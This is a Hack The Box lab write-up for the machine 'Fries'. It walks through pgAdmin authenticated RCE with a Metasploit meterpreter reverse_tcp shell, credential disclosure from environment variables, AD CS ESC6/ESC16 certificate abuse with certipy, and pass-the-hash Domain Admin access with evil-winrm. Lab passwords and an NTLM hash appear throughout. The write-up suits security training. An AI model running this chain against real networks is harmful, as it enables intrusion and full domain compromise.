# HTB Fries — Writeup

## Hosts Configuration

Add the following entries to `/etc/hosts`:

```
10.10.11.96 fries.htb DC01.fries.htb
10.10.11.99 pwm.fries.htb
10.10.11.98 db-mgmt05.fries.htb
```

---

## Reconnaissance

### Open Ports (nmap)

Key services identified:

- **22** — OpenSSH (Ubuntu)
- **53** — DNS
- **80 / 443** — nginx (redirects to `fries.htb`)
- **88** — Kerberos
- **389** — LDAP (Active Directory)
- **445** — SMB
- **5985** — WinRM
- **9389** — AD Web Services
- Multiple **MSRPC** endpoints

Domain identified: **fries.htb**  
Domain Controller: **DC01.fries.htb**

---

## Initial Foothold — pgAdmin Exploitation

### Target

Backend database management interface:

```
http://db-mgmt05.fries.htb
```

### Known Credentials

PostgreSQL root password:

```
root : PsqLR00tpaSS11
```

pgAdmin credentials:

```
d.cooper@fries.htb : D4LE11maan!!
```

---

### Metasploit Exploit

Module used:

```
exploit/multi/http/pgadmin_query_tool_authenticated
```

Key options:

```
RHOSTS    db-mgmt05.fries.htb
RPORT     80
USERNAME  d.cooper@fries.htb
PASSWORD  D4LE11maan!!
DB_USER   root
DB_PASS   PsqLR00tpaSS11
DB_NAME   ps_db
PAYLOAD   python/meterpreter/reverse_tcp
```

Result: **Meterpreter shell obtained**

---

### Environment Credential Disclosure

From the compromised pgAdmin container:

```
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
```

Valid credentials:

```
admin@fries.htb : Friesf00Ds2025!!
```

---

## Active Directory Escalation — AD CS Abuse

### Service Account Credentials

```
svc_infra@fries.htb : m6tneOMAh5p0wQ0d
```

---

### AD CS Misconfiguration

- Certificate Authority: `fries-DC01-CA`
- Vulnerabilities:
  - **ESC6** — Editable CA configuration
  - **ESC16** — Disabled extension restrictions

CA configuration modified to allow SID injection and arbitrary UPNs.

---

### Certificate Request (Administrator)

Requesting certificate with Administrator SID:

```bash
certipy req \
  -u 'svc_infra@fries.htb' \
  -p 'm6tneOMAh5p0wQ0d' \
  -dc-ip 10.10.11.96 \
  -ca 'fries-DC01-CA' \
  -template 'User' \
  -upn 'administrator@fries.htb' \
  -sid 'S-1-5-21-858338346-3861030516-3975240472-500' \
  -dynamic-endpoint
```

Certificate obtained:

```
administrator.pfx
```

---

### Certificate Authentication

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.96
```

Result:

```
NTLM hash:
aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
```

---

## Domain Admin Access

Connect using WinRM:

```bash
evil-winrm -i 10.10.11.96 -u 'administrator' -H 'a773cb05d79273299a684a23ede56748'
```

➡️ **Domain Administrator shell obtained**

---

## Attack Path Summary

1. pgAdmin authenticated RCE
2. Environment variable credential disclosure
3. AD CS misconfiguration (ESC6 + ESC16)
4. Certificate-based Administrator impersonation
5. NTLM hash retrieval
6. WinRM Domain Admin access

---

## Key Vulnerabilities

- Exposed pgAdmin with weak credentials
- Hardcoded credentials in environment variables
- Misconfigured Active Directory Certificate Services
- Lack of certificate template restrictions
- Insufficient CA hardening

---

## Tools Used

- nmap
- Metasploit
- pgAdmin
- certipy
- evil-winrm

**Difficulty**: Hard  
**Impact**: Full Domain Compromise
